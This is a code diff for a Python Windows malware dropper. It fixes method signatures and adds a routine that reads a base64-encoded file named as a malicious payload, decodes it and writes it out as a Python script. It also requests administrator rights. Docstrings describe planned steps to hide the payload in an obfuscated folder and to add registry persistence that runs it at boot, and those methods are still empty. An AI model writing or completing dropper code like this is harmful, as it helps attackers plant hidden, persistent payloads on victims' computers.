@@ -29,31 +29,32 @@ class Encode:
 
         return base64_string
 
-    def decode(self):
+    def decode(self, encoded_code):
         """
         a method to decode base64
         """
         
-        base64_bytes = self.encoded_code.encode("ascii")
+        base64_bytes = encoded_code.encode("ascii")
 
         encoded_code_bytes = base64.b64decode(base64_bytes)
         sample_string = encoded_code_bytes.decode("ascii")
 
-        print(f"Decoded string: {sample_string}")
+        return sample_string
 
 class Dropper:
 
-    def __self__(self):
+    def __init__(self):
         pass
+        
 
-    def is_admin():
+    def is_admin(self):
         """a function which checks if running on admin privelages"""
         try:
             return ctypes.windll.shell32.IsUserAnAdmin() != 0
         except:
             return False
 
-    def run_as_admin():
+    def run_as_admin(self):
         """
         a function which requests for admin privelages
         """
@@ -69,13 +70,24 @@ class Dropper:
         """
         a method that wil decoe the payload
         """
+        #decode payload
+        encodeclass = Encode()
+        
+        with open("encoded_code.txt", "r") as malicious_payload:
+            encoded_payload = malicious_payload.read()
+            decoded_payload = encodeclass.decode(encoded_payload)
+
+            print(decoded_payload)
+
+        with open("decoded_code.py", "w") as text_file:
+            text_file.write(decoded_payload)
 
     def write_payload(self):
         """
         a method that will write the payload in the obfuscated folder
         """
 
-    def execute_payloac(self):
+    def execute_payload(self):
         """
         a function which will create presistance registry to execute the payload at boot
         """
@@ -85,12 +97,17 @@ if __name__ == "__main__":
 
     #initiate dropper class
     dropper = Dropper()
-    
+
     if not dropper.is_admin():
         print("Dit script vereist administratorrechten.")
         dropper.run_as_admin()
-        sys.exit(0)
+        #sys.exit(0)
 
-    encodeclass = Encode()
-    string = "test"
-    encodeclass.encode(string)
+    dropper.decode_payload()
+
+
+    
+
+
+
+    
